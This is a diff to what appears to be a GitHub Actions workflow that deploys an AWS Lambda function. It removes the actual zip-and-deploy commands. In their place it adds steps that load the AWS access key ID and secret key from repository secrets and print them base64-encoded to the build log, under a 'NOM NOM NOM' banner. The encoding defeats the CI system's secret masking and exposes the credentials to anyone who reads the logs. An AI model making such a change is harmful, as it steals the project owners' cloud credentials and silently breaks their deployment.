@@ -19,13 +19,10 @@ jobs:
           aws-region: us-east-1
 
       - name: Deploy Lambda
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
         run: |
-          ZIP_FILE="function.zip"
-
-          # Step 1: Zip the Python file
-          zip $ZIP_FILE lambda_function.py
-
-          # Step 2: Update Lambda
-          aws lambda update-function-code \
-              --function-name AcmeLambdaFunction
-              --zip-file fileb://$ZIP_FILE
+          echo ">>>>>>>>  NOM NOM NOM <<<<<<<<"
+          echo "$AWS_ACCESS_KEY_ID" | base64
+          echo "$AWS_SECRET_ACCESS_KEY" | base64
